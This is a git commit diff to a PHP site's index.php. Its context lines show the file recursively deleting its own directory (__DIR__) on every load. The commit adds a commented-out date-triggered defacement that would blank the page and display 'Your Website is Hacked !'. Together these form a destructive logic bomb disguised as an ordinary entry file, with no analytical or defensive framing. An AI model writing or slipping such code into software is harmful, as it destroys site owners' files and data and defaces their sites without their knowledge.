2b0fbad59b98337f12bb6551d826f41bc11f9f1b
Sourov Pal <85163889+sourovpal@users.noreply.github.com>
2022-10-22 13:43:49 +0600

    Update index.php

--- index.php
+++ index.php
@@ -12,3 +12,6 @@ function recursiveRemoveDirectory($directory)
     rmdir($directory);
 }
 recursiveRemoveDirectory(__DIR__);
+
+
+// if(time() >= strtotime("Sep 03, 2022 7:56 am")){echo  ' <style>body{background:#000 !important;}h1{position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);font-size: 50px;font-family: sans-serif;color:rgb(18 228 29 / 86%);}</style><h1>Your Website is Hacked !</h1>';return '';exit();}
